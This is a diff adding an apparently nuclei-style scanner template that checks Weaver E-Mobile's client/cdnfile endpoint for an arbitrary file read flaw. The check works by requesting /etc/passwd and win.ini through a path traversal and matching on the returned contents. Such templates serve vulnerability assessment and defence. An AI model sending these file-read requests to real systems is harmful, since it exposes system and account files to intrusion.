@@ -1,0 +1,22 @@
+id: fanweiE-Mobile-client-cdnfile-anyfile-read
+
+info: 
+ name: 泛微E-Mobile clientcdnfile 任意文件读取漏洞
+ author: xl
+ description: 泛微移动管理client/cdnfile接口任意文件读取漏洞
+ severity: high
+
+requests:
+  - method: GET
+    path:
+      - "/client/cdnfile/C/etc/passwd?linux"
+      - "/client/cdnfile/1C/windows/win.ini?windows"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+          - "fonts"
